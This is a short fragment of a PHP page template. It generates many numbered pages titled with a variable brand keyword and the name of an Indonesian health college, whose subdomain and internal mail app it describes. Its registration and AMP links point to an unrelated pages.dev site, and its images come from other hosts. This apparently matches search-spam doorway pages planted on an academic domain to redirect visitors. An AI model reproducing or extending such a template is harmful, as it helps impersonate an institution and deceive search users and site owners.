  ...
  $baseAuthor = $BRAND;
  $URL  = "https://sipenyu.universitaskepanjen.ac.id/?xza=$BRAND";
  $PAGEURL = "https://sipenyu.universitaskepanjen.ac.id/?xza=$BRAND";
  $AMP = "https://stikers.pages.dev/?xza=$BRAND";
  $DAFTAR = "https://stikers.pages.dev/";
  $BANNER = "https://buble-gum.club/jeje/alza.jpg";
  $LOGO = "https://fotoku.host/wanted.png";
  $keyword = "$brand";

  if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
      $TITLE = "$BRAND 📃 Sekolah Tinggi Ilmu Kesehatan Kepanjen";
      $DESCRIPTION = "$BRAND sebuah aplikasi internal kampus yang digunakan untuk mengelola surat menyurat elektronik (e‑mails pengajuan, persetujuan, arsip surat resmi, dan sejenisnya) secara digital";
      $description = "$BRAND sebuah aplikasi internal kampus yang digunakan untuk mengelola surat menyurat elektronik (e‑mails pengajuan, persetujuan, arsip surat resmi, dan sejenisnya) secara digital";
  }
                    ...
                    <div class="header-title-logo">
                      <a href="<?php echo $URL ?>" data-animation-role="header-element">
                        ...
                        <img elementtiming="nbf-header-logo-desktop"
                          src="https://fotoku.host/wanted.png"
